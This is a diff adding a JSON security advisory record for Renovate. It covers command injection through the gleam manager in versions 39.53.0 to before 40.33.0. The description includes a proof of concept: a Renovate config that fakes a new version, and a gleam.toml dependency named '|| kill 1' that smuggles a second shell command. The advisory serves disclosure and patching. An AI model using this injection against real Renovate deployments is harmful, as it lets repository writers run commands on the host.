@@ -1,0 +1,46 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-01-13T20:29:03Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "renovate"
+  },
+  "Advisory": {
+    "DatabaseId": 331904,
+    "Id": "GSA_kwCzR0hTQS14anI3LTNjM2ctbTc2M84ABRCA",
+    "GhsaId": "GHSA-xjr7-3c3g-m763",
+    "References": [
+      {
+        "Url": "https://github.com/renovatebot/renovate/security/advisories/GHSA-xjr7-3c3g-m763"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-xjr7-3c3g-m763"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-xjr7-3c3g-m763"
+      }
+    ],
+    "Description": "### Summary\nThe user-provided string `depName` in the `gleam` manager is appended to the `gleam deps update` command without proper sanitization.\n\n### Details\nAdversaries can provide a maliciously crafted `gleam.toml` in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.\nAll values added to the `packagesToUpdate` variable in [lib/modules/manager/gleam/artifacts.ts](https://github.com/renovatebot/renovate/blob/e9cbd02865b1827f7e4269c05250a12ee2203a71/lib/modules/manager/gleam/artifacts.ts) are not being escaped using the `quote` function from the `shlex` package.\nThis lack of proper sanitization has been present in the product since version 39.53.0 (https://github.com/renovatebot/renovate/commit/d29698e0131231652970f02765312769975e4d38), released on December 6 of 2024.\n\n### PoC\n1. Create a git repo with the following content:\n\n`renovate.json5`:\n\n```json5\n{\n  $schema: \"https://docs.renovatebot.com/renovate-schema.json\",\n  customDatasources: {\n    always: {\n      defaultRegistryUrlTemplate: \"https://docs.renovatebot.com/search/search_index.json\",\n      transformTemplates: ['{\"releases\":[{\"version\":\"99999.0.0\"}]}'],\n    },\n  },\n  packageRules: [\n    {\n      // Target of the day\n      matchManagers: [\"gleam\"],\n      // Trick the manager in believing there's a new version\n      overrideDatasource: \"custom.always\",\n    },\n  ],\n}\n\n```\n\n\n`gleam.toml`:\n\n```toml\nname = \"renovate-aci-2\"\nversion = \"0.0.1\"\n\n[dependencies]\n\"|| kill 1\" = \"0.1.0\"\n```\n\n\n`manifest.toml`:\n\n```toml\nnon-empty file\n```\n\n2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting \"Repository finished\", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.\n\n### Impact\nThis is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-13T20:29:00Z",
+    "Severity": "MODERATE",
+    "Summary": "Renovate vulnerable to arbitrary command injection via gleam manager and malicious gleam.toml file",
+    "UpdatedAt": "2026-01-13T20:29:03Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 6.7,
+      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "40.33.0"
+      },
+      "VulnerableVersionRange": "\u003e= 39.53.0, \u003c 40.33.0"
+    }
+  ]
+}
